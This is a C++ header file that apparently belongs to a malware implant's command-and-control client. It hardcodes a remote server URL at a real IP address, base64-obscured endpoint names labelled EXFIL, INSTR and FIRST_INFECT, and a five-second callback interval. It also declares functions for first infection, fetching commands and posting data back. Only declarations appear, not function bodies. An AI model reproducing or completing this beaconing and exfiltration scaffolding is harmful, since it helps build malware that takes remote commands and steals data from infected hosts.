#ifndef REQUEST_H
#define REQUEST_H
#include <cstdlib>
#include <string>
#include <iostream>
#include <fstream>
#include <vector>
#include <sstream>
#include <chrono>
#include <thread>
#include <curl/curl.h>

//Consts
static const std::string URL = "http://51.79.54.105:5000/";
static const std::string EXFIL = "aGF0c3UK";
static const std::string INSTR = "R1JOQ2hlZXRhaAo";
static const std::string FIRST_INFECT = "ZGlyawo"; 
static const int CALLBACK_INTERVAL = 5; //seconds

static std::string infectedHostname = "";
size_t CurlcallbackFuncToString(void *contents, size_t size, size_t nmemb, std::string *s);
std::string curl_get(std::string url, std::string endpoint);
void curl_post(std::string url, std::string endpoint, std::string data);
std::vector<std::string> command();
void first_infection();
void check_and_post();
#endif
